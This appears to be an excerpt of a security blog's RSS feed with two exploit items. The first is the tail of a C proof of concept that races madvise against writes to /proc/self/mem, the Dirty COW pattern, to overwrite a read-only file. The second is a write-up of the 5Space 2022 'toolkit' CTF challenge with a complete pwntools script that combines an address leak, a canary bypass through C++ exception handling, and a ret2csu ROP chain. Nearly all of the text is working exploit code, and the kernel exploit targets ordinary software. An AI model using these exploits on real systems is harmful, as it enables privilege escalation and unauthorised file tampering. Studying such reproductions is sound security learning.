<a class="sourceLine" id="cb10-5" title="5"><span class="pp">#include </span><span class="im">&lt;pthread.h&gt;</span></a>
<a class="sourceLine" id="cb10-6" title="6"><span class="pp">#include </span><span class="im">&lt;unistd.h&gt;</span></a>
<a class="sourceLine" id="cb10-7" title="7"><span class="pp">#include </span><span class="im">&lt;sys/stat.h&gt;</span></a>
<a class="sourceLine" id="cb10-8" title="8"><span class="pp">#include </span><span class="im">&lt;string.h&gt;</span></a>
<a class="sourceLine" id="cb10-9" title="9"><span class="pp">#include </span><span class="im">&lt;stdint.h&gt;</span></a>
<a class="sourceLine" id="cb10-10" title="10"></a>
<a class="sourceLine" id="cb10-11" title="11"><span class="kw">struct</span> stat dst_st, fk_st;</a>
<a class="sourceLine" id="cb10-12" title="12"><span class="dt">void</span> * map;</a>
<a class="sourceLine" id="cb10-13" title="13"><span class="dt">char</span> *fake_content;</a>
<a class="sourceLine" id="cb10-14" title="14"></a>
<a class="sourceLine" id="cb10-15" title="15"><span class="dt">void</span> * madviseThread(<span class="dt">void</span> * argv);</a>
<a class="sourceLine" id="cb10-16" title="16"><span class="dt">void</span> * writeThread(<span class="dt">void</span> * argv);</a>
<a class="sourceLine" id="cb10-17" title="17"></a>
<a class="sourceLine" id="cb10-18" title="18"><span class="dt">int</span> main(<span class="dt">int</span> argc, <span class="dt">char</span> ** argv)</a>
<a class="sourceLine" id="cb10-19" title="19">{</a>
<a class="sourceLine" id="cb10-20" title="20">    <span class="cf">if</span> (argc &lt; <span class="dv">3</span>)</a>
<a class="sourceLine" id="cb10-21" title="21">    {</a>
<a class="sourceLine" id="cb10-22" title="22">        puts(<span class="st">&quot;usage: ./poc destination_file fake_file&quot;</span>);</a>
<a class="sourceLine" id="cb10-23" title="23">        <span class="cf">return</span> <span class="dv">0</span>;</a>
<a class="sourceLine" id="cb10-24" title="24">    }</a>
<a class="sourceLine" id="cb10-25" title="25"></a>
<a class="sourceLine" id="cb10-26" title="26">    pthread_t write_thread, madvise_thread;</a>
<a class="sourceLine" id="cb10-27" title="27"></a>
<a class="sourceLine" id="cb10-28" title="28">    <span class="dt">int</span> dst_fd, fk_fd;</a>
<a class="sourceLine" id="cb10-29" title="29">    dst_fd = open(argv[<span class="dv">1</span>], O_RDONLY);</a>
<a class="sourceLine" id="cb10-30" title="30">    fk_fd = open(argv[<span class="dv">2</span>], O_RDONLY);</a>
<a class="sourceLine" id="cb10-31" title="31">    printf(<span class="st">&quot;fd of dst: %d</span><span class="sc">\n</span><span class="st">fd of fk: %d</span><span class="sc">\n</span><span class="st">&quot;</span>, dst_fd, fk_fd);</a>
<a class="sourceLine" id="cb10-32" title="32"></a>
<a class="sourceLine" id="cb10-33" title="33">    fstat(dst_fd, &amp;dst_st); <span class="co">// get destination file length</span></a>
<a class="sourceLine" id="cb10-34" title="34">    fstat(fk_fd, &amp;fk_st); <span class="co">// get fake file length</span></a>
<a class="sourceLine" id="cb10-35" title="35">    map = mmap(NULL, dst_st.st_size, PROT_READ, MAP_PRIVATE, dst_fd, <span class="dv">0</span>);</a>
<a class="sourceLine" id="cb10-36" title="36"></a>
<a class="sourceLine" id="cb10-37" title="37">    fake_content = malloc(fk_st.st_size);</a>
<a class="sourceLine" id="cb10-38" title="38">    read(fk_fd, fake_content, fk_st.st_size);</a>
<a class="sourceLine" id="cb10-39" title="39"></a>
<a class="sourceLine" id="cb10-40" title="40">    pthread_create(&amp;madvise_thread, NULL, madviseThread, NULL);</a>
<a class="sourceLine" id="cb10-41" title="41">    pthread_create(&amp;write_thread, NULL, writeThread, NULL);</a>
<a class="sourceLine" id="cb10-42" title="42"></a>
<a class="sourceLine" id="cb10-43" title="43">    pthread_join(madvise_thread, NULL);</a>
<a class="sourceLine" id="cb10-44" title="44">    pthread_join(write_thread, NULL);</a>
<a class="sourceLine" id="cb10-45" title="45"></a>
<a class="sourceLine" id="cb10-46" title="46">    <span class="cf">return</span> <span class="dv">0</span>;</a>
<a class="sourceLine" id="cb10-47" title="47">}</a>
<a class="sourceLine" id="cb10-48" title="48"></a>
<a class="sourceLine" id="cb10-49" title="49"><span class="dt">void</span> * writeThread(<span class="dt">void</span> * argv)</a>
<a class="sourceLine" id="cb10-50" title="50">{</a>
<a class="sourceLine" id="cb10-51" title="51">    <span class="dt">int</span> mm_fd = open(<span class="st">&quot;/proc/self/mem&quot;</span>, O_RDWR);</a>
<a class="sourceLine" id="cb10-52" title="52">    printf(<span class="st">&quot;fd of mem: %d</span><span class="sc">\n</span><span class="st">&quot;</span>, mm_fd);</a>
<a class="sourceLine" id="cb10-53" title="53">    <span class="cf">for</span> (<span class="dt">int</span> i = <span class="dv">0</span>; i &lt; <span class="bn">0x100000</span>; i++)</a>
<a class="sourceLine" id="cb10-54" title="54">    {</a>
<a class="sourceLine" id="cb10-55" title="55">        lseek(mm_fd, (off_t) map, SEEK_SET);</a>
<a class="sourceLine" id="cb10-56" title="56">        write(mm_fd, fake_content, fk_st.st_size);</a>
<a class="sourceLine" id="cb10-57" title="57">    }</a>
<a class="sourceLine" id="cb10-58" title="58"></a>
<a class="sourceLine" id="cb10-59" title="59">    <span class="cf">return</span> NULL;</a>
<a class="sourceLine" id="cb10-60" title="60">}</a>
<a class="sourceLine" id="cb10-61" title="61"></a>
<a class="sourceLine" id="cb10-62" title="62"><span class="dt">void</span> * madviseThread(<span class="dt">void</span> * argv)</a>
<a class="sourceLine" id="cb10-63" title="63">{</a>
<a class="sourceLine" id="cb10-64" title="64">    <span class="cf">for</span> (<span class="dt">int</span> i = <span class="dv">0</span>; i &lt; <span class="bn">0x100000</span>; i++){</a>
<a class="sourceLine" id="cb10-65" title="65">        madvise(map, <span class="bn">0x100</span>, MADV_DONTNEED);</a>
<a class="sourceLine" id="cb10-66" title="66">    }</a>
<a class="sourceLine" id="cb10-67" title="67"></a>
<a class="sourceLine" id="cb10-68" title="68">    <span class="cf">return</span> NULL;</a>
<a class="sourceLine" id="cb10-69" title="69">}</a></code></pre></div>]]></description>
    <pubDate>Sun, 9 Oct 2022 13:29:19 +0800</pubDate>
  </item>
   
  <item>
    <title><![CDATA[toolkit]]></title>
    <link>https://blog.mark0519.com/#//#/reproduce/220920-toolkit</link>
    <guid isPermaLink="false">https://blog.mark0519.com/#//#/reproduce/220920-toolkit</guid>
    <description><![CDATA[<h1 id="toolkit">toolkit</h1>
<blockquote>
<p>Category: PWN</p>
<p>Date: 2022/09/20</p>
<p>Authorship: 5Space 2022</p>
</blockquote>
<h2 id="x00-c异常处理绕过canary">0x00 C++异常处理绕过canary</h2>
<p><a href="https://www.anquanke.com/post/id/89855】#h2-11">Shanghai-DCTF-2017 线下攻防Pwn题 - 安全客，安全资讯平台 (anquanke.com)</a></p>
<p>简单来说就是覆盖rbp和返回地址，甚至通过大量溢出覆盖上个函数的返回地址，之后触发C++异常处理，输入错误的内容让程序进入catch处理</p>
<p>需要注意的是，rbp需要控制成存在异常处理函数的调用者函数（caller）</p>
<h2 id="x01-例题-第五空间2022-toolkit">0x01 例题 第五空间2022 toolkit</h2>
<p>堆溢出泄露elf地址</p>
<p>栈溢出利用异常处理绕过cannary然后csu rop去orw打印flag</p>
<div class="sourceCode" id="cb1"><pre class="sourceCode python"><code class="sourceCode python"><a class="sourceLine" id="cb1-1" title="1"><span class="co"># -*- coding: utf-8 -*-</span></a>
<a class="sourceLine" id="cb1-2" title="2"><span class="im">from</span> pwn <span class="im">import</span> <span class="op">*</span></a>
<a class="sourceLine" id="cb1-3" title="3">context(os<span class="op">=</span><span class="st">&#39;linux&#39;</span>,arch<span class="op">=</span><span class="st">&#39;amd64&#39;</span>)</a>
<a class="sourceLine" id="cb1-4" title="4">context.log_level <span class="op">=</span> <span class="st">&#39;debug&#39;</span></a>
<a class="sourceLine" id="cb1-5" title="5"></a>
<a class="sourceLine" id="cb1-6" title="6">elf <span class="op">=</span> ELF(<span class="st">&quot;./toolkit&quot;</span>)</a>
<a class="sourceLine" id="cb1-7" title="7">libc <span class="op">=</span> ELF(<span class="st">&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;</span>)</a>
<a class="sourceLine" id="cb1-8" title="8">local <span class="op">=</span> <span class="dv">1</span></a>
<a class="sourceLine" id="cb1-9" title="9"></a>
<a class="sourceLine" id="cb1-10" title="10"><span class="cf">if</span> local:</a>
<a class="sourceLine" id="cb1-11" title="11">    p <span class="op">=</span> process(<span class="st">&quot;./toolkit&quot;</span>)    </a>
<a class="sourceLine" id="cb1-12" title="12"><span class="cf">else</span>:</a>
<a class="sourceLine" id="cb1-13" title="13">    <span class="co"># libc = ELF(&#39;libc.so.6&#39;)</span></a>
<a class="sourceLine" id="cb1-14" title="14">    p <span class="op">=</span> remote(<span class="st">&quot;&quot;</span>,<span class="st">&quot;&quot;</span>)</a>
<a class="sourceLine" id="cb1-15" title="15"></a>
<a class="sourceLine" id="cb1-16" title="16"><span class="kw">def</span> debug(p,cmd<span class="op">=</span><span class="st">&quot;&quot;</span>):</a>
<a class="sourceLine" id="cb1-17" title="17">    <span class="cf">if</span> local:</a>
<a class="sourceLine" id="cb1-18" title="18">        gdb.attach(p,cmd)</a>
<a class="sourceLine" id="cb1-19" title="19">    <span class="cf">else</span>:</a>
<a class="sourceLine" id="cb1-20" title="20">        <span class="cf">pass</span></a>
<a class="sourceLine" id="cb1-21" title="21"></a>
<a class="sourceLine" id="cb1-22" title="22"><span class="kw">def</span> choice(cmd):</a>
<a class="sourceLine" id="cb1-23" title="23">    p.recvuntil(<span class="st">&quot;[+]&quot;</span>)</a>
<a class="sourceLine" id="cb1-24" title="24">    p.sendline(<span class="bu">str</span>(cmd))</a>
<a class="sourceLine" id="cb1-25" title="25"></a>
<a class="sourceLine" id="cb1-26" title="26"></a>
<a class="sourceLine" id="cb1-27" title="27"><span class="kw">def</span> gift(passwd):</a>
<a class="sourceLine" id="cb1-28" title="28">    choice(<span class="bn">0xDEAD00</span>)</a>
<a class="sourceLine" id="cb1-29" title="29">    p.sendlineafter(b<span class="st">&quot;Password:&quot;</span>,passwd)</a>
<a class="sourceLine" id="cb1-30" title="30"></a>
<a class="sourceLine" id="cb1-31" title="31"></a>
<a class="sourceLine" id="cb1-32" title="32"><span class="kw">def</span> tools2_func2(size,data,key):</a>
<a class="sourceLine" id="cb1-33" title="33">    choice(<span class="dv">2</span>)</a>
<a class="sourceLine" id="cb1-34" title="34">    p.sendlineafter(b<span class="st">&quot;[-]&quot;</span>,<span class="st">&quot;2&quot;</span>)</a>
<a class="sourceLine" id="cb1-35" title="35">    p.sendlineafter(b<span class="st">&quot;Length: &quot;</span>,<span class="bu">str</span>(size))</a>
<a class="sourceLine" id="cb1-36" title="36">    p.sendlineafter(b<span class="st">&quot;Content: &quot;</span>,data)</a>
<a class="sourceLine" id="cb1-37" title="37">    p.sendlineafter(b<span class="st">&quot;Key:&quot;</span>,key)</a>
<a class="sourceLine" id="cb1-38" title="38"></a>
<a class="sourceLine" id="cb1-39" title="39"><span class="kw">def</span> csu(elf_base,call,rdi,rsi,rdx):</a>
<a class="sourceLine" id="cb1-40" title="40">    csu_front<span class="op">=</span>elf_base<span class="op">+</span><span class="bn">0x2910</span></a>
<a class="sourceLine" id="cb1-41" title="41">    csu_end<span class="op">=</span>elf_base<span class="op">+</span><span class="bn">0x292a</span></a>
<a class="sourceLine" id="cb1-42" title="42">    payload <span class="op">=</span> p64(csu_end)<span class="op">+</span>p64(<span class="dv">0</span>)<span class="op">+</span>p64(<span class="dv">1</span>)<span class="op">+</span>p64(rdi)<span class="op">+</span>p64(rsi)<span class="op">+</span>p64(rdx)<span class="op">+</span>p64(call)<span class="op">+</span>p64(csu_front)</a>
<a class="sourceLine" id="cb1-43" title="43">    payload <span class="op">+=</span> b<span class="st">&#39;</span><span class="ch">\x00</span><span class="st">&#39;</span><span class="op">*</span><span class="bn">0x38</span></a>
<a class="sourceLine" id="cb1-44" title="44">    <span class="cf">return</span> payload</a>
<a class="sourceLine" id="cb1-45" title="45"></a>
<a class="sourceLine" id="cb1-46" title="46"></a>
<a class="sourceLine" id="cb1-47" title="47"></a>
<a class="sourceLine" id="cb1-48" title="48">gift(b<span class="st">&#39;a&#39;</span><span class="op">*</span><span class="bn">0x210</span>)</a>
<a class="sourceLine" id="cb1-49" title="49">p.recvuntil(b<span class="st">&#39;a&#39;</span><span class="op">*</span><span class="bn">0x210</span>)</a>
<a class="sourceLine" id="cb1-50" title="50">elf_base <span class="op">=</span> u64(p.recv(<span class="dv">6</span>).ljust(<span class="dv">8</span>,b<span class="st">&#39;</span><span class="ch">\x00</span><span class="st">&#39;</span>))<span class="op">-</span><span class="bn">0x150a</span></a>
<a class="sourceLine" id="cb1-51" title="51"><span class="bu">print</span>(<span class="st">&quot;[elf_base] ==&gt;&quot;</span>,<span class="bu">hex</span>(elf_base))</a>
<a class="sourceLine" id="cb1-52" title="52">leave_ret <span class="op">=</span> elf_base<span class="op">+</span><span class="bn">0x1512</span></a>
<a class="sourceLine" id="cb1-53" title="53">rbp <span class="op">=</span> elf_base<span class="op">+</span><span class="bn">0x5060</span></a>
<a class="sourceLine" id="cb1-54" title="54">ret <span class="op">=</span> elf_base<span class="op">+</span><span class="bn">0x25db</span></a>
<a class="sourceLine" id="cb1-55" title="55"><span class="bu">print</span>(<span class="st">&quot;[leave_ret] ==&gt;&quot;</span>,<span class="bu">hex</span>(leave_ret))</a>
<a class="sourceLine" id="cb1-56" title="56"><span class="bu">print</span>(<span class="st">&quot;[rbp] ==&gt;&quot;</span>,<span class="bu">hex</span>(rbp))</a>
<a class="sourceLine" id="cb1-57" title="57"><span class="bu">print</span>(<span class="st">&quot;[ret] ==&gt;&quot;</span>,<span class="bu">hex</span>(ret))</a>
<a class="sourceLine" id="cb1-58" title="58"></a>
<a class="sourceLine" id="cb1-59" title="59"><span class="bu">print</span>(<span class="st">&quot;[open] ==&gt;&quot;</span>,<span class="bu">hex</span>(elf_base<span class="op">+</span>elf.plt[<span class="st">&#39;open&#39;</span>]))</a>
<a class="sourceLine" id="cb1-60" title="60">pop_rdi <span class="op">=</span> elf_base<span class="op">+</span><span class="bn">0x0000000000002933</span></a>
<a class="sourceLine" id="cb1-61" title="61">pop_rbp <span class="op">=</span> elf_base<span class="op">+</span><span class="bn">0x0000000000001473</span></a>
<a class="sourceLine" id="cb1-62" title="62">pop_rsi_r15 <span class="op">=</span> elf_base<span class="op">+</span><span class="bn">0x0000000000002931</span></a>
<a class="sourceLine" id="cb1-63" title="63"></a>
<a class="sourceLine" id="cb1-64" title="64"></a>
<a class="sourceLine" id="cb1-65" title="65">rop_gadget <span class="op">=</span> p64(pop_rdi)</a>
<a class="sourceLine" id="cb1-66" title="66">rop_gadget <span class="op">+=</span> p64(rbp)</a>
<a class="sourceLine" id="cb1-67" title="67">rop_gadget <span class="op">+=</span> p64(pop_rsi_r15)</a>
<a class="sourceLine" id="cb1-68" title="68">rop_gadget <span class="op">+=</span> p64(<span class="dv">0</span>)<span class="op">*</span><span class="dv">2</span></a>
<a class="sourceLine" id="cb1-69" title="69">rop_gadget <span class="op">+=</span> p64(elf_base<span class="op">+</span><span class="bn">0x1270</span>) <span class="co"># open</span></a>
<a class="sourceLine" id="cb1-70" title="70">rop_gadget <span class="op">+=</span> csu(elf_base,elf_base<span class="op">+</span><span class="bn">0x4f60</span>,<span class="dv">3</span>,rbp<span class="op">+</span><span class="bn">0x100</span>,<span class="bn">0x30</span>) <span class="co"># read</span></a>
<a class="sourceLine" id="cb1-71" title="71">rop_gadget <span class="op">+=</span> p64(pop_rdi)</a>
<a class="sourceLine" id="cb1-72" title="72">rop_gadget <span class="op">+=</span> p64(rbp<span class="op">+</span><span class="bn">0x100</span>)</a>
<a class="sourceLine" id="cb1-73" title="73">rop_gadget <span class="op">+=</span> p64(elf_base<span class="op">+</span>elf.plt[<span class="st">&#39;puts&#39;</span>])</a>
<a class="sourceLine" id="cb1-74" title="74">rop_gadget <span class="op">+=</span> p64(<span class="bn">0xdeadbeaf</span>)</a>
<a class="sourceLine" id="cb1-75" title="75"></a>
<a class="sourceLine" id="cb1-76" title="76">debug(p,<span class="st">&quot;b * &quot;</span><span class="op">+</span><span class="bu">hex</span>(elf_base<span class="op">+</span>elf.plt[<span class="st">&#39;open&#39;</span>]))</a>
<a class="sourceLine" id="cb1-77" title="77">tools2_func2(<span class="op">-</span><span class="dv">1</span>,b<span class="st">&quot;./flag&quot;</span>.ljust(<span class="dv">8</span>,b<span class="st">&#39;</span><span class="ch">\x00</span><span class="st">&#39;</span>)<span class="op">+</span>p64(<span class="bn">0x30</span>)<span class="op">+</span>p64(rbp)<span class="op">*</span>(<span class="bu">int</span>(<span class="bn">0x138</span><span class="op">/</span><span class="dv">8</span>)<span class="op">-</span><span class="dv">2</span>)<span class="op">+</span>p64(ret)<span class="op">+</span>p64(<span class="bn">0xdeadbaef</span>)<span class="op">*</span><span class="dv">5</span><span class="op">+</span>rop_gadget,<span class="st">&quot;1&quot;</span><span class="op">*</span><span class="dv">17</span>)</a>
<a class="sourceLine" id="cb1-78" title="78"></a>
<a class="sourceLine" id="cb1-79" title="79"><span class="co"># debug(p)</span></a>
<a class="sourceLine" id="cb1-80" title="80"></a>
<a class="sourceLine" id="cb1-81" title="81">p.interactive()</a></code></pre></div>
<h2 id="x02-碎碎念">0x02 碎碎念</h2>
<p>还有一个奇怪的点是，ubuntu22中pwntools直接用elf.plt拿函数地址偏移总是有问题，这里我全是用gdb看got表手算偏移来orw的~</p>]]></description>
    <pubDate>Tue, 20 Sep 2022 16:55:16 +0800</pubDate>
  </item>
  
</channel>
</rss>
